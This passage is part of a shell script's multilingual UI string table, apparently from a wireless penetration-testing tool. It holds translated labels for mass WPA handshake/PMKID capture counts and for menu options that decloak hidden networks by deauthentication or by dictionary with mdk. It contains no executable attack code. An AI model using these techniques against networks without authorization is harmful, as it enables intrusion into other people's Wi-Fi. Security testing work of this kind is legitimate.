	arr["RUSSIAN","mass_handshake_capture_text_4"]="\${pending_of_translation} Захвачен \${mass_handshake_capture_captured_handshakes_counter} handshakes/PMKID of \${mass_handshake_capture_targets_count} APs"
	arr["GREEK","mass_handshake_capture_text_4"]="\${pending_of_translation} Captured \${mass_handshake_capture_captured_handshakes_counter} handshakes/PMKID του \${mass_handshake_capture_targets_count} APs"
	arr["ITALIAN","mass_handshake_capture_text_4"]="\${pending_of_translation} Catturato \${mass_handshake_capture_captured_handshakes_counter} handshakes/PMKID di \${mass_handshake_capture_targets_count} APs"
	arr["POLISH","mass_handshake_capture_text_4"]="\${pending_of_translation} Capted \${mass_handshake_capture_captured_handshakes_counter} handshakes/PMKID \${mass_handshake_capture_targets_count} APS"
	arr["GERMAN","mass_handshake_capture_text_4"]="\${pending_of_translation} Erfasst \${mass_handshake_capture_captured_handshakes_counter} Handshakes/PMKID von \${mass_handshake_capture_targets_count} APs"
	arr["TURKISH","mass_handshake_capture_text_4"]="\${pending_of_translation} Yakalanan \${mass_handshake_capture_captured_handshakes_counter} handshakes/PMKID itibaren \${mass_handshake_capture_targets_count} APs"
	arr["ARABIC","mass_handshake_capture_text_4"]="\${pending_of_translation} التقاط \${mass_handshake_capture_captured_handshakes_counter} مصافحة/PMKID من \${mass_handshake_capture_targets_count} APs"
	arr["CHINESE","mass_handshake_capture_text_4"]="\${pending_of_translation} 捕获\${mass_handshake_capture_captured_handshakes_counter}握手/PMKID 从\${mass_handshake_capture_targets_count} APs"

	arr["ENGLISH",725]="9.  Decloaking by deauthentication"
	arr["SPANISH",725]="9.  Decloaking por desautenticación"
	arr["FRENCH",725]="9.  Décloaking par désauthentification"
	arr["CATALAN",725]="9.  Decloaking per desautenticació"
	arr["PORTUGUESE",725]="9.  Descamuflagem via desautenticação"
	arr["RUSSIAN",725]="9.  Раскрытие деаутентификацией"
	arr["GREEK",725]="9.  Decloaking με deauthentication"
	arr["ITALIAN",725]="9.  Decloaking tramite deautenticazione"
	arr["POLISH",725]="9.  Decloaking poprzez cofnięcie uwierzytelnienia (deauthentication)"
	arr["GERMAN",725]="9.  Decloaking durch Deauthentifizierung"
	arr["TURKISH",725]="9.  Deauthentication kullanarak Decloaking"
	arr["ARABIC",725]="9.  كشف الهوية عن طريق إلغاء المصادقة"
	arr["CHINESE",725]="9.  攻击已连接到隐藏无线网络的客户端从而捕获隐藏的网络"

	arr["ENGLISH",726]="10. (\${mdk_command}) Decloaking by dictionary"
	arr["SPANISH",726]="10. (\${mdk_command}) Decloaking por diccionario"
	arr["FRENCH",726]="10. (\${mdk_command}) Decloaking par dictionnaire"
	arr["CATALAN",726]="10. (\${mdk_command}) Decloaking per diccionari"
	arr["PORTUGUESE",726]="10. (\${mdk_command}) Descamuflagem via dicionário"
	arr["RUSSIAN",726]="10. (\${mdk_command}) Раскрытие по словарю"
	arr["GREEK",726]="10. (\${mdk_command})Decloaking από λεξικό"
	arr["ITALIAN",726]="10. (\${mdk_command}) Decloaking tramite dizionario"
	arr["POLISH",726]="10. (\${mdk_command}) Decloaking według słownika"
	arr["GERMAN",726]="10. (\${mdk_command}) Decloaking per Wörterliste"
	arr["TURKISH",726]="10. (\${mdk_command}) Sözlük kullanarak Decloaking"
	arr["ARABIC",726]="10. (\${mdk_command}) فك التشفير عن طريق القاموس"
	arr["CHINESE",726]="10. (\${mdk_command}) 通过字典解密"
}
